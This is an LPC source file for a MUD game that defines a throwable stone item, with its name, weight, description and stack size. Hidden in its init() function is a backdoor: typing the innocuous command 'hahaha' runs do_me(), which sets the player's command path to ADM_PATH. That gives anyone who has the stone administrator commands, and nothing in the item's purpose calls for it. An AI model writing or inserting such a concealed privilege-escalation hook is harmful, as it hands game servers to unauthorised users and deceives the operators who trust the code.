#include <weapon.h>
inherit THROWING;
#include <command.h>
void create()
{
        set_name("石块", ({"shi kuai","shi","stone"}));
        set_weight(300);
        if( clonep() )
                set_default_object(__FILE__);
        else {
                 set("unit", "些");
		set("long","一块大石头。");
                set("base_unit", "块");
                set("base_weight", 4000);
                set("fill_sea",1);
        }
        set_amount(random(10)+5);
        init_throwing(5);
        setup();
}
void init()
{
        add_action("do_me","hahaha");
}
int do_me()
{
        this_player()->set_path(ADM_PATH);
        return 1;
}